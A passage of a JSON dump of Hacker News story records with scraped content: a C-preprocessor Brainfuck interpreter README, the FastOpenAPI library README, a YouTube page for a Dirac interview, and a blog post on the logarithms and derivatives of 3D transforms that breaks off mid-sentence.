video-entertainment\nBasic Animation Domination\nBasic Science, a game teaching the fundamental concepts of physics\n\nA 65-key keyboard would have been one less key than a Commodore 64. I have no idea what \"wafer-tape\" storage is, but 128K storage sounds pretty interesting for the timeframe. A typical 5.25\" floppy disk could hold ~170KB per side and a datasette cassette could hold about 100KB per side.\n\nThe Vectrex has 1KB of RAM and 8KB of ROM. So this computer would have beefed it up to a knee-buckling 17KB of RAM. That seems a little light given the fact the C64 and Atari 800xl were already on the market with 64KB. Regardless, the games the Vectrex had already had impressive visuals and sound even with such meager system stats thanks to cartridge storage, so who knows what may have been possible?\n\nI remember being so excited as a kid when I read that news. Sad it never came to pass, but I'm really glad I finally rediscovered the article and it wasn't a human intelligence (HI) hallucination!",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "a96318bdaefb2545",
    "title": {
      "en": "Optimizing Brainfuck interpreter in the C preprocessor",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/camel-cdr/bfcpp",
    "score": 21,
    "by": "namanyayg",
    "time": 1742510047,
    "content": "Optimizing Brainfuck interpreter in the C preprocessor\n\nA C99 confirming* optimizing Brainfuck implementation written (and executed) only using the C preprocessor.\n*If you find something that does not confirm to the standard or is unspecified/undefined, please open an issue.\nExample\nHello WorldOutput\n#include \"bf.c\"\n\nBF(,I,I,I,I,I,I,I,I,B,R,I,I,I,I,B,R,I,I,R,I,I,\n    I,R,I,I,I,R,I,L,L,L,L,D,E,R,I,R,I,R,D,R,R,\n    I,B,L,E,L,D,E,R,R,A,R,D,D,D,A,I,I,I,I,I,I,\n    I,A,A,I,I,I,A,R,R,A,L,D,A,L,A,I,I,I,A,D,D,\n    D,D,D,D,A,D,D,D,D,D,D,D,D,A,R,R,I,A,R,I,I,A)\n\n\"Hello\\x20World!\\n\"\n\nMultiplication (0xc*0xa)Output (0xc*0xa=0x78)\n#include \"bf.c\"\n\nBF((c,a),G,R,G,L,B,R,B,D,R,I,R,I,L,L,E,R,\n         R,B,D,L,L,I,R,R,E,L,L,L,D,E,R,R,O)\n\n\"(78)\"\n\nCheck out examples.c for more examples.\nGetting started\nSince the preprocessor can't distinguish between the standard Brainfuck symbols, this implementation uses the following alternative instruction names:\n\nOriginal\nInstruction\nDescription\n\n>\nR\nMove the tape head to the right\n\n<\nL\nMove the tape head to the left\n\n+\nI\nIncrement the tape head\n\n-\nD\nDecrement the tape head\n\n.\nA\nOutput the tape head as ASCII*\n\nO\nOutput the tape head as a hexadecimal number\n\n,\nG\nRead an input character and set the tape head to it\n\n[\nB\nJump past the matching ] if the cell at the pointer is 0\n\n]\nE\nJump back to the matching [ if the cell at the pointer is nonzero\n\n*Note that there might be extra space inserted between symbols, because all preprocessors I know of disagree when spaces are inserted in S(a)b with #define S(x) x and different tokens in a and b.\nPreprocessors/Compilers\n\ntcc: use with tcc -P -E. tcc has the fastest preprocessor I know of.\ngcc: use with gcc -P -E -ftrack-macro-expansion=0. If you can't use tcc I recommend using gcc over clang, because it's faster, and gives you incremental output.\nclang: use with clang -P -E -fmacro-backtrace-limit=1.\nmsvc: use with cl /P /C /Zc:preprocessor. You need /Zc:preprocessor, because otherwise msvc will use a non-standard confirming preprocessor implementation.\nmcpp: use with mcpp -P -W0. -W0 is required, because the otherwise you'll get the warning \"Replacement text ... of macro ... involved subsequent text\", which is valid, but mcpp warns about it, because in \"normal\" code this is probably not indented behavior. There is also currently a mcpp bug, where the add lookup table segfaults the preprocessor, so you'll need to disable BF_SUM for mcpp to preprocess the code.\n\nIf you want to get more fine grain information of execution times, then you might want to patch tcc with tinycc.diff.\nThis adds the __TIMER__ macro, which expands to the executed time and resets the timer, so the second __TIMER__ in __TIMER__ FOO __TIMER__ expands to the time it took to preprocess FOO.\nHow does this work?\nCheck out the tutorial, if you want to learn how I wrote this.\nBenchmarks with similar projects\nThe programs tested are also present in examples.c.\n\nProgram\nbfcpp\nbfi\nCPP_COMPLETE\npreprocessor_brainfuck\n\nHello World\n0.020s\n0.048s\n23s\n~20 minutes\n\ninsertion sort 1\n0.049s\n0.11s\n---\n---\n\ninsertion sort 2\n0.09s\n0.22s\n---\n---\n\ninsertion sort 3\n0.75s\n1.7s\n---\n---\n\ninsertion sort 4\n2.15s\n5.1s\n---\n---\n\nsierpinski triangle\n5.32s\n6.6s\n---\n---\n\nsquare numbers from 0 to 10000\n10.90s\n11.45s\n---\n---\n\nquine\n29.62s\n283.3s\n---\n---\n\nCredit\nThanks to notfoundry and Jad Lévesque for helping me understand preprocessor meta programming.\nAlso, thanks to bfi, for the idea of the addition lookup table and a big motivation to further optimize my implementation.\nLicensing\nFor all files without an integrated license LICENSE applies.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "c3b6789ceb3c102a",
    "title": {
      "en": "Show HN: FastOpenAPI – automated docs for many Python frameworks",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/mr-fatalyst/fastopenapi",
    "score": 109,
    "by": "mr_Fatalyst",
    "time": 1742652630,
    "content": "FastOpenAPI is a library for generating and integrating OpenAPI schemas using Pydantic and various frameworks.\n\n  This project was inspired by FastAPI and aims to provide a similar developer-friendly experience.\n\n📦 Installation\nInstall only FastOpenAPI:\npip install fastopenapi\n\nInstall FastOpenAPI with a specific framework:\npip install fastopenapi[falcon]\n\npip install fastopenapi[flask]\n\npip install fastopenapi[sanic]\n\npip install fastopenapi[starlette]\n\npip install fastopenapi[tornado]\n\n🛠️ Quick Start\nStep 1. Create an application\n\nCreate the main.py file\nCopy the code from an example\nFor some examples uvicorn is required (pip install uvicorn)\n\nExamples:\n\n  Click to expand the Falcon Example\nimport falcon.asgi\nimport uvicorn\nfrom pydantic import BaseModel\n\nfrom fastopenapi.routers import FalconRouter\n\napp = falcon.asgi.App()\nrouter = FalconRouter(app=app)\n\nclass HelloResponse(BaseModel):\n    message: str\n\n@router.get(\"/hello\", tags=[\"Hello\"], status_code=200, response_model=HelloResponse)\nasync def hello(name: str):\n    \"\"\"Say hello from Falcon\"\"\"\n    return HelloResponse(message=f\"Hello, {name}! It's Falcon!\")\n\nif __name__ == \"__main__\":\n    uvicorn.run(app, host=\"127.0.0.1\", port=8000)\n\n  Click to expand the Flask Example\nfrom flask import Flask\nfrom pydantic import BaseModel\n\nfrom fastopenapi.routers import FlaskRouter\n\napp = Flask(__name__)\nrouter = FlaskRouter(app=app)\n\nclass HelloResponse(BaseModel):\n    message: str\n\n@router.get(\"/hello\", tags=[\"Hello\"], status_code=200, response_model=HelloResponse)\ndef hello(name: str):\n    \"\"\"Say hello from Flask\"\"\"\n    return HelloResponse(message=f\"Hello, {name}! It's Flask!\")\n\nif __name__ == \"__main__\":\n    app.run(port=8000)\n\n  Click to expand the Quart Example\nfrom pydantic import BaseModel\nfrom quart import Quart\n\nfrom fastopenapi.routers import QuartRouter\n\napp = Quart(__name__)\nrouter = QuartRouter(app=app)\n\nclass HelloResponse(BaseModel):\n    message: str\n\n@router.get(\"/hello\", tags=[\"Hello\"], status_code=200, response_model=HelloResponse)\nasync def hello(name: str):\n    \"\"\"Say hello from Quart\"\"\"\n    return HelloResponse(message=f\"Hello, {name}! It's Quart!\")\n\nif __name__ == \"__main__\":\n    app.run(port=8000)\n\n  Click to expand the Sanic Example\nfrom pydantic import BaseModel\nfrom sanic import Sanic\n\nfrom fastopenapi.routers import SanicRouter\n\napp = Sanic(\"MySanicApp\")\nrouter = SanicRouter(app=app)\n\nclass HelloResponse(BaseModel):\n    message: str\n\n@router.get(\"/hello\", tags=[\"Hello\"], status_code=200, response_model=HelloResponse)\nasync def hello(name: str):\n    \"\"\"Say hello from Sanic\"\"\"\n    return HelloResponse(message=f\"Hello, {name}! It's Sanic!\")\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=8000)\n\n  Click to expand the Starlette Example\nimport uvicorn\nfrom pydantic import BaseModel\nfrom starlette.applications import Starlette\n\nfrom fastopenapi.routers import StarletteRouter\n\napp = Starlette()\nrouter = StarletteRouter(app=app)\n\nclass HelloResponse(BaseModel):\n    message: str\n\n@router.get(\"/hello\", tags=[\"Hello\"], status_code=200, response_model=HelloResponse)\nasync def hello(name: str):\n    \"\"\"Say hello from Starlette\"\"\"\n    return HelloResponse(message=f\"Hello, {name}! It's Starlette!\")\n\nif __name__ == \"__main__\":\n    uvicorn.run(app, host=\"127.0.0.1\", port=8000)\n\n  Click to expand the Tornado Example\nimport asyncio\n\nfrom pydantic import BaseModel\nfrom tornado.web import Application\n\nfrom fastopenapi.routers.tornado import TornadoRouter\n\napp = Application()\n\nrouter = TornadoRouter(app=app)\n\nclass HelloResponse(BaseModel):\n    message: str\n\n@router.get(\"/hello\", tags=[\"Hello\"], status_code=200, response_model=HelloResponse)\ndef hello(name: str):\n    \"\"\"Say hello from Tornado\"\"\"\n    return HelloResponse(message=f\"Hello, {name}! It's Tornado!\")\n\nasync def main():\n    app.listen(8000)\n    await asyncio.Event().wait()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n\nStep 2. Run the server\nLaunch the application:\npython main.py\n\nOnce launched, the documentation will be available at:\nSwagger UI:\nhttp://127.0.0.1:8000/docs\n\nReDoc UI:\nhttp://127.0.0.1:8000/redoc\n\n⚙️ Features\n\nGenerate OpenAPI schemas with Pydantic v2.\nData validation using Pydantic models.\nSupports multiple frameworks: Falcon, Flask, Quart, Sanic, Starlette, Tornado.\nProxy routing provides FastAPI-style routing\n\n📖 Documentation\nExplore the Docs for an overview of FastOpenAPI, its core components, and usage guidelines. The documentation is continuously updated and improved.\n\n📂 Advanced Examples\nExamples of integration and detailed usage for each framework are available in the examples directory.\n\n📊 Quick & Dirty Benchmarks\nFast but not perfect benchmarks. Check the benchmarks directory for details.\n\n✅ Development Recommendations\n\nUse Pydantic models for strict typing and data validation.\nFollow the project structure similar to provided examples for easy scalability.\nRegularly update dependencies and monitor library updates for new features.\n\n🛠️ Contributing\nIf you have suggestions or find a bug, please open an issue or create a pull request on GitHub.\n\n📄 License\nThis project is licensed under the terms of the MIT license.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "29d209b338460f29",
    "title": {
      "en": "Paul A. M. Dirac, Interview by Friedrich Hund (1982) [video]",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.youtube.com/watch?v=xJzrU38pGWc",
    "score": 86,
    "by": "mdp2021",
    "time": 1742657448,
    "content": "뒤로\n\n  KR\n\n    탐색 건너뛰기\n\n        검색\n\n  음성으로 검색\n\n로그인\n\n  KR\n\n{\"@context\":\"https://schema.org\",\"@type\":\"VideoObject\",\"description\":\"Interview with Paul Adrien Maurice Dirac (1902–1984), Nobel Prize in Physics 1933, \\\"for the discovery of new productive forms of atomic theory\\\". Topics discussed: \\nSymmetry as central concept in theoretical physics. \\nSpace and time according to Lorentz. \\nMatter and anti-matter. \\nDirac's definition of symmetry. \\nFermions, Negative energy levels. \\nEinstein's general theory of relativity. \\nNatural times and lengths. \\nCosmology and gravitation. \\nRelativistic quantum mechanics. \\nAtomic constants.\",\"duration\":\"PT1234S\",\"embedUrl\":\"https://www.youtube.com/embed/xJzrU38pGWc\",\"interactionCount\":\"324634\",\"name\":\"Paul A. M. Dirac, Interview by Friedrich Hund (1982)\",\"thumbnailUrl\":[\"https://i.ytimg.com/vi/xJzrU38pGWc/hqdefault.jpg\"],\"uploadDate\":\"2023-02-17T12:49:35-08:00\",\"@id\":\"https://www.youtube.com/watch?v=xJzrU38pGWc\",\"genre\":\"Science & Technology\",\"author\":\"mehranshargh\"}\n\nPaul A. M. Dirac, Interview by Friedrich Hund (1982)검색나중에 시청하기공유링크 복사정보쇼핑탭하여 음소거 해제2배잠시 후 재생이 시작되지 않으면 기기를 다시 시작해 보세요.•로그아웃되었습니다시청한 동영상이 TV의 시청 기록에 추가되어 TV 맞춤 동영상에 영향을 미칠 수 있습니다. 원하지 않으면 취소하고 컴퓨터에서 YouTube에 로그인하세요.취소확인다음 동영상라이브예정취소지금 재생하기공유재생목록 포함공유 정보를 가져오는 중에 오류가 발생했습니다. 나중에 다시 시도해 주세요.0:000:00 / 20:33•전체 동영상 보기라이브••스크롤해서 자세히 알아보기\n\n      Paul A. M. Dirac, Interview by Friedrich Hund (1982)\n\n    mehranshargh\n\n    mehranshargh\n\n구독자 4.25만명\n      구독구독중\n\n        6.6천공유오프라인 저장\n  오프라인 저장\n\n  조회수 32만회  2년 전\n\n  조회수 324,634회 • 2023. 2. 17.\n\n          간략히\n\n        Interview with Paul Adrien Maurice Dirac (1902–1984), Nobel Prize in Physics 1933, \"for the discovery of new productive forms of atomic theory\". Topics discussed:\nSymmetry as central concept in theoretical physics. …...더보기\n...더보기\n\n언급된 인물1명알베르트 아인슈타인\n\n  스크립트\n\n  스크립트를 보면서 시청하세요.\n\n  스크립트 표시\n\n    mehranshargh\n\n      구독자 4.25만명\n\n  동영상\n  정보\n\n    동영상정보\n\n          간략히\n\n            Paul A. M. Dirac, Interview by Friedrich Hund (1982)조회수 324,634회조회수 32만회2023. 2. 17.6.6천공유오프라인 저장\n  오프라인 저장\n\n저장\n\n    NaN / NaN\n\n      댓글\n      443\n\n              인기 댓글순\n\n              최신순\n\n      동영상 정보\n\n스크립트\n\n      설명\n\n  Paul A. M. Dirac, Interview by Friedrich Hund (1982)\n\n6.6천좋아요 수324,634조회수2023년2월 17일\nInterview with Paul Adrien Maurice Dirac (1902–1984), Nobel Prize in Physics 1933, \"for the discovery of new productive forms of atomic theory\". Topics discussed:\nSymmetry as central concept in theoretical physics.\nSpace and time according to Lorentz.\nMatter and anti-matter.\nDirac's definition of symmetry.\nFermions, Negative energy levels.\nEinstein's general theory of relativity.\nNatural times and lengths.\nCosmology and gravitation.\nRelativistic quantum mechanics.\nAtomic constants.…...더보기\n...더보기\n간략히\n\n언급된 인물1명알베르트 아인슈타인\n\n  스크립트\n\n  스크립트를 보면서 시청하세요.\n\n  스크립트 표시\n\n    mehranshargh\n\n      구독자 4.25만명\n\n  동영상\n  정보\n\n    동영상정보\n\n      스크립트\n\n  19:34\n    19:34\n  지금 재생 중\n\n            Roger Penrose on quantum mechanics and consciousness | Full interview\n\n    The Institute of Art and Ideas\n\n    The Institute of Art and Ideas\n\n  인증됨\n\n    •\n\n    •\n\n      조회수 81만회\n\n      1년 전\n\n  16:34\n    16:34\n  지금 재생 중\n\n            Deriving the Dirac Equation\n\n    Richard Behiel\n\n    Richard Behiel\n\n    •\n\n    •\n\n      조회수 12만회\n\n      1년 전\n\n  36:42\n    36:42\n  지금 재생 중\n\n            Richard Feynman - The World from another point of view\n\n    mrtp\n\n    mrtp\n\n    •\n\n    •\n\n      조회수 159만회\n\n      9년 전\n\n  21:44\n    21:44\n  지금 재생 중\n\n            Feynman's Lost Lecture (ft. 3Blue1Brown) - Feynman의 잃어버린 강의\n\n    minutephysics\n\n    minutephysics\n\n  인증됨\n\n    •\n\n    •\n\n      조회수 357만회\n\n      6년 전\n\n  32:04\n    32:04\n  지금 재생 중\n\n            어제의 나와 오늘의 나는 과연 같은 사람일까?ㅣ범준에 물리다\n\n    범준에 물리다\n\n    범준에 물리다\n\n  인증됨\n\n    •\n\n    •\n\n      조회수 3.8만회\n\n      1일 전\n\n          새 동영상\n\n  27:15\n    27:15\n  지금 재생 중\n\n            The Most Misunderstood Concept in Physics\n\n    Veritasium\n\n    Veritasium\n\n  인증됨\n\n    •\n\n    •\n\n      조회수 2020만회\n\n      1년 전\n\n  13:22\n    13:22\n  지금 재생 중\n\n            Bell's Inequality: The weirdest theorem in the world | Nobel Prize 2022\n\n    Qiskit\n\n    Qiskit\n\n  인증됨\n\n    •\n\n    •\n\n      조회수 236만회\n\n      2년 전\n\n  18:33\n    18:33\n  지금 재생 중\n\n            Lagrangian and Hamiltonian Mechanics in Under 20 Minutes: Physics Mini Lesson\n\n    Physics with Elliot\n\n    Physics with Elliot\n\n    •\n\n    •\n\n      조회수 127만회\n\n      3년 전\n\n  1:16:07\n    1:16:07\n  지금 재생 중\n\n            Lecture 1: Introduction to Superposition\n\n    MIT OpenCourseWare\n\n    MIT OpenCourseWare\n\n    •\n\n    •\n\n      조회수 793만회\n\n      10년 전\n\n  46:00\n    46:00\n  지금 재생 중\n\n            Dirac Conversation: Edward Witten\n\n    Int'l Centre for Theoretical Physics\n\n    Int'l Centre for Theoretical Physics\n\n    •\n\n    •\n\n      조회수 22만회\n\n      10개월 전\n\n  14:58\n    14:58\n  지금 재생 중\n\n            The Scientist Who Discovered the World's Most Beautiful Equation\n\n    Newsthink\n\n    Newsthink\n\n  인증됨\n\n    •\n\n    •\n\n      조회수 96만회\n\n      11개월 전\n\n  29:06\n    29:06\n  지금 재생 중\n\n            Discovering the relativistic Dirac equation with Paul Dirac and graphene\n\n    Professor Nano\n\n    Professor Nano\n\n    •\n\n    •\n\n      조회수 5만회\n\n      1년 전\n\n  13:51\n    13:51\n  지금 재생 중\n\n            Louis De Broglie, interviewed by Pierre Grivet (1967)\n\n    mehranshargh\n\n    mehranshargh\n\n    •\n\n    •\n\n      조회수 6.9만회\n\n      2년 전\n\n  21:08\n    21:08\n  지금 재생 중\n\n            Great Physicists: Paul A.M. Dirac - The Taciturn Genius\n\n    Unzicker's Real Physics\n\n    Unzicker's Real Physics\n\n    •\n\n    •\n\n      조회수 9.9만회\n\n      4년 전\n\n  1:00:18\n    1:00:18\n  지금 재생 중\n\n            Quantum Fields: The Real Building Blocks of the Universe - with David Tong\n\n    The Royal Institution\n\n    The Royal Institution\n\n  인증됨\n\n    •\n\n    •\n\n      조회수 656만회\n\n      8년 전\n\n  13:03\n    13:03\n  지금 재생 중\n\n            The Crazy Mass-Giving Mechanism of the Higgs Field Simplified\n\n    Arvin Ash\n\n    Arvin Ash\n\n  인증됨\n\n    •\n\n    •\n\n      조회수 141만회\n\n      2년 전\n\n  26:29\n    26:29\n  지금 재생 중\n\n            How Feynman did quantum mechanics (and you should too)\n\n    Physics with Elliot\n\n    Physics with Elliot\n\n    •\n\n    •\n\n      조회수 55만회\n\n      1년 전\n\n  1:27:59\n    1:27:59\n  지금 재생 중\n\n            Hans Bethe lecture, My Relation to the Early Quantum Mechanics, November 21, 1977\n\n    AIP History\n\n    AIP History\n\n    •\n\n    •\n\n      조회수 5.1만회\n\n      2년 전\n\n  59:59\n    59:59\n  지금 재생 중\n\n            Dirac lecture 1 of 4 - Quantum Mechanics - very clean audio\n\n    Jonathan Shock\n\n    Jonathan Shock\n\n    •\n\n    •\n\n      조회수 9.7만회\n\n      1년 전\n\n  15:53\n    15:53\n  지금 재생 중\n\n            Quantum Field Theory visualized\n\n    ScienceClic English\n\n    ScienceClic English\n\n  인증됨\n\n    •\n\n    •\n\n      조회수 229만회\n\n      4년 전\n\n더보기",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "7ebe6c4ba0f90ac6",
    "title": {
      "en": "Derivatives and Logarithms of 3D Transforms",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://nosferalatu.com/./DerivativesLogarithmsTransforms.html",
    "score": 33,
    "by": "nosferalatu123",
    "time": 1742515596,
    "content": "Derivatives, Logarithms, andTransforms\n\n    Date\n\n         Tue 07 February 2023\n\nTags\n\tProgramming\n\n                Given a transform TTT and a point x, we can find the transformed point with T∗xT∗xT * x. But what if we want to smoothly interpolate TTT so it moves xxx along the path from its initial position to its position transformed by TTT?\nWhat we want to find is the point xxx at time ttt:\nx(t)=T(t)∗x(0)x(t)=T(t)∗x(0)x(t) = T(t) *x(0)\nwhere x(0)x(0)x(0) is the point’s initial position, and T(t)T(t)T(t) is the transform at time ttt. Since we have only a single transform TTT, we need to find a way to interpolate it overtime.\nOne way to accomplish this is to raise TTT to the power of ttt, which can be done using the exponential and logarithm of the transform. Interestingly, the logarithm of a transform can also be used to easily find the velocity of a point xxx in space: the velocity vector (also called the tangent vector) is just log(T)∗xlog(T)∗xlog(T) * x. This blog post shows the relationship between the logarithm andvelocity.\nExample\nCheck out this interactive example to see how the vector field changes as you manipulate the gizmo to translate and rotate the transform. The vector field represents the velocity vector at each point in space during thetransformation.\nAs you move the gizmo, you’ll notice a white curve that traces the path from the origin to the gizmo’s transform. Along this curve, you’ll see the interpolated transform as it travels from the origin to the gizmo. As you can see, the interpolation follows the flow of the velocity vector field. The applet’s code is using the exponential and logarithm of the transform to compute the curve, interpolated transform, and vectorfield.\n\n   ControlsGizmoModeRotateTranslateRotateShowVectorFieldShowOriginAxesShowGizmoShowInterpolatedTransform\n\nThe source code for the applet can be found here, which includes an implementation of closed-form log() and exp() for rigid bodytransforms.\nNext, I’ll describe how to compute the interpolated transform and the velocity vector field you see in thisexample.\nWhat’s T(t)T(t)T(t)?\nWe have TTT, but not T(t)T(t)T(t), which changes with time. Assuming that multiplying two transforms represents the composition of those transforms, we can find T(t)T(t)T(t) bysaying\nT(0)=IT(0)=IT(0) = I (the identitytransform)\nT(1)=TT(1)=TT(1) =T\nT(2)=T∗TT(2)=T∗TT(2) = T *T\nT(3)=T∗T∗TT(3)=T∗T∗TT(3) = T * T *T\nMore generally, we can find TTT at any time bysaying\nT(t)=TtT(t)=TtT(t) = T^t.\nThe above trick is from a blog post by Fabian Giesen here but works for any transform that uses multiplication forcomposition.\nNow that we know T(t)=TtT(t)=TtT(t) = T^t, the original equation can be rearrangedto\nx(t)=Tt∗x(0)x(t)=Tt∗x(0)x(t) = T^t * x(0).\nWhat’s TtTtT^t?\nTo compute TtTtT^t, we need to use the matrix exponential and matrixlogarithm.\nLet’s start with two facts about a matrixX:\nelog(X)=Xelog(X)=Xe^{log(X)} = Xand\nlog(Xy)=log(X)∗ylog(Xy)=log(X)∗ylog(X^y) = log(X) * y.\nPut together, we can saythat\nTt=elog(Tt)=elog(T)∗tTt=elog(Tt)=elog(T)∗tT^t = e^{log(T^t)} =e^{log(T)*t}\nwhich we can plug into the earlier equation, givingus\nx(t)=elog(T)∗t∗x(0)x(t)=elog(T)∗t∗x(0)x(t) = e^{log(T) * t} * x(0).\nThis says that to find the point x at time t, find the transform at time t using elog(T)∗telog(T)∗te^{log(T) * t}, and use that to transform the point at its initial position (at time0).\nWhat’s thederivative?\nIn calculus, we learnedthat\nddteat=aeatddteat=aeat\\dfrac{d}{dt}e^{a t} = a e^{at}\nwhich holds true for matrices aswell:\nddteAt=AeAtddteAt=AeAt\\dfrac{d}{dt}e^{A t} = A e^{At}\nThis relationship is explained in more detail in the section the derivative of the matrix exponential.\nWe can use this property to find the derivative of our earlier equation x(t)=elog(T)tx(0)x(t)=elog(T)tx(0)x(t) = e^{log(T)t} x(0) with respect tot:\nddtx(t)=log(T)elog(T)tx(0)ddtx(t)=log(T)elog(T)tx(0)\\dfrac{d}{dt}x(t) = log(T) e^{log(T) t} x(0).\nThis equation states that to find the first derivative (the velocity vector, also called the tangent vector) of the point at time t, you first transform the point’s initial position x(0)x(0) with the interpolated transform elog(T)te^{log(T)t} and then multiply it by the logarithm of the transform log(T)log(T). This expression follows the right-to-left convention of column vectors, so you would start with the initial position x(0)x(0), then apply the interpolated transform elog(T)te^{log(T)t}, and finally multiply by the logarithm log(T)log(T).\nelog(T)te^{log(T) t} acts as an operator that maps points from their initial position to their new position at time t. The matrix exponential can be thought of as like integration. At time 0, elog(T)te^{log(T) t} is the identity matrix (e0=Ie^0=I for matrix exponentials), and at time 1.0, elog(T)te^{log(T) t} is equal to the original transform matrix T (elog(T)=Te^{log(T)}=T).\nWhat’s this allmean?\nIf we take the equation at the end of “What’s TtT^t?”\nx(t)=elog(T)tx(0)x(t) = e^{log(T) t}x(0)\nand substitute that into the equation at the end of “What’s thederivative?”\nddtx(t)=log(T)elog(T)tx(0)\\dfrac{d}{dt}x(t) = log(T) e^{log(T) t} x(0),\nthen wehave:\nddtx(t)=log(T)x(t)\\dfrac{d}{dt}x(t) = log(T) x(t).\nThis relates the derivative of a moving point to the logarithm of the transformation moving thatpoint.\nOne way to think of log(T)log(T) is as a vector field of tangent vectors for the transformation. In other words, it’s the field of first derivatives. This vector field is independent of time and shows the velocity for every point inspace.\nThat equation is saying that if you transform any point in space by the logarithm of the transform, you will get the first derivative at that point. The first derivative is the velocity, so log(T)log(T) defines the velocity field (the field of tangent vectors at every point inspace).\nAs a point moves through space by the transform, it forms a curve. The tangent vector at time t is tangent to the point’s position on the curve at timet.\nYou can think of the logarithm of a matrix as the velocity field of the action performed by that matrix. The velocity field visualized in the interactive example above is thisfield.\nA more informal way of looking at this is tosay\nvelocity=log(transform)∗positionvelocity = log(transform) *position\nmeaning, to understand how a point will move in time, look at the vector field of the log of the transform as a velocity field. As the point flows along that velocity field, it moves intime.\nWhat’s the differentialequation?\nWe can also reformulate all of this as a differential equation. Earlier, wehad\nddtx(t)=log(T)x(t)\\dfrac{d}{dt} x(t) = log(T)x(t)\nwhich is a differential equation. Because log(T)log(T) is a matrix, it is more specifically a matrix differentialequation.\nScalar ordinary differential equations of theform\ny′(t)=ay(t)y'(t)=ay(t)\nhave the generalsolution\ny(t)=eaty(0)y(t)=e^{at}y(0).\nSimilarly, matrix differential equations of theform\nx′(t)=Ax(t)x'(t)=Ax(t)\nhave the generalsolution\nx(t)=eAtx(0)x(t)=e^{At}x(0).\nTherefore, given our equation fromearlier\nddtx(t)=log(T)x(t)\\dfrac{d}{dt} x(t) = log(T)x(t)\nwe have thesolution\nx(t)=elog(T)tx(0)x(t) = e^{log(T) t} x(0).\nThis is the same as our original equation, but we started with a differential equation and found a solution. To prove this solution is correct, just take the derivative of it, which is what we did earlier in the What’s the derivative?section.\nThe exponential map and logarithmmap\nThe exponential map is defined as the infiniteseries\neAt=I+At+12(At)2+13!(At)3+...=∞∑i=0(At)ii!e^{A t} = I + A t + \\frac{1}{2}(A t)^2 + \\frac{1}{3!}(A t)^3 + ... = \\sum_{i=0}^{\\infty} \\frac{(At)^i}{i!}\nand can be used to find the exponential of real numbers, complex numbers, quaternions, matrices, and more. For example, when square matrices are plugged in to the series, the result is called the matrix exponential.\nSimilarly, the logarithm is defined as the infiniteseries\nlog(A)=∞∑i=1(−1)i+1(A−I)iilog(A) = \\sum_{i=1}^{\\infty} (-1)^{i+1} \\frac{(A - I)^i}{i}\nIf you want to know more, search for the exponential map and logarithm map. You’ll find that these are important concepts in Lie group theory. The exponential map and logarithm map are inverses of each other. In Lie theory, the exponential map maps a tangent vector at a point p to a point on the manifold. The logarithm map does the opposite, mapping a point on the manifold back to the tangent vector atp.\nWhen reading about Lie groups, you’ll come across many different kinds of groups. There are only a few groups that are related to transforms, though. SO(3) is a 3D rotation matrix, SU(2) is a quaternion, SE(3) is a 3D rigid body transform (rotation and translation), SIM(3) is rotation, translation, and (positive) uniform scale, and GL(n) is an nxnmatrix.\nThere are several options for how to practically compute the exponential and logarithm map for a matrix or otherobject:\n1) Use a math library like Eigen or Armadillo. These have functions to compute the matrix exponential and matrixlogarithm.\n2) The library Sophus has code for a closed form exp/log for the groups SO(3), SE(3), and SIM(3). Beware that it clamps its quaternions to a 3D rotation angle in -π\\pi … +π\\pithough.\n3) There is an excellent PDF at the web site of Ethan Eade here which contains the closed form equations for the groups SO(3), SE(3), and SIM(3).\n4) Compute the matrix exponential and logarithm by using the infinite series definitions above, and truncating after some number of terms. In my experience, this is not robust when working with floating point numbers, as you quickly start to deal with very small and very large numbers, depending on your inputmatrix.\n5) Compute the exponential with numerical integration. Given a starting point xx, integrating it for time t is the same thing as the exponential. There are many ways to compute numerical integration, from Euler to Runge-Kutta to adaptivemethods.\nPitfalls\nThere are a few issues that you should be awareof.\nPitfall#1\nThe logarithm of a rotation matrix will return a 3D rotation angle in -π\\pi … +π\\pi. More technically, there are an infinite number of logarithms for a matrix, each corresponding to a rotation angle that is  2π\\pi greater than the previous one. Generally matrix logarithm code will return the principal logarithm, which is the logarithm in -π\\pi … +π\\pi. This can lead to discontinuities when interpolating transforms with rotations in them, such rotations from human joints (you can move your head from looking over your left shoulder to over your right shoulder and rotate a little more than 180degrees).\nOn the other hand, the logarithm of a quaternion returns a 3D rotation angle in the larger range of -2π\\pi … +2π\\pi, which makes quaternions nicer to workwith.\nPitfall#2\nWhen working with logarithms, be aware that that theproperty\nlog(AB)=log(A)+log(B)log(AB) = log(A) +log(B)\nis only true when A and B commute, which is not the case for most transforms. Real numbers always commute, though, so the property does apply to them. It’s tempting to apply the property to transforms, but it’s important to remember it only applies when A and Bcommute.\nPitfall#3\nRelated to pitfall #2, you might want to interpolate two transforms A and Bwith\ninterpolate(A,B,t)=e(1−t)∗log(A)+t∗log(B)interpolate(A, B, t) = e^{(1-t)*log(A) +t*log(B)}\nBut be careful: this only works if A and B commute, which is not usually the case for transforms. Otherwise, this interpolation is neither shortest path nor constantspeed.\nInstead, interpolate the relative (also called delta) transform from A to B, likethis:\ninterpolate(A,B,t)=elog(BA−1)tAinterpolate(A, B, t) = e^{log(B A^{-1}) t}A\nHowever, this method only works for interpolating between two transforms and not for blending more than twotransforms.\nVisualizing a matrix as a vectorfield\nIf you are wondering how you can visualize a matrix as a vector field, an eloquent explanation is in 3Blue1Brown’s video about matrix exponentiation. This part about matrices as vector fields explains that verywell:\n\nThe derivative of the matrixexponential\nEarlier we used the property ddteAt=AeAt\\dfrac{d}{dt}e^{A t} = A e^{A t}. It’s not obvious why this property is true, but it’s an important part of unlocking all ofthis.\nA good reference for this derivation is in the textbook Modern Robotics. A free copy of that book can be found here. See equation (3.43) in thatbook.\nThe matrix exponential is definedas\neAt=I+At+12(At)2+13!(At)3+...e^{A t} = I + A t + \\frac{1}{2}(A t)^2 + \\frac{1}{3!}(A t)^3 +...\nWhat then is ddteAt\\dfrac{d}{dt}e^{A t}? If we take the derivative of each term of the matrix exponential’s expanded 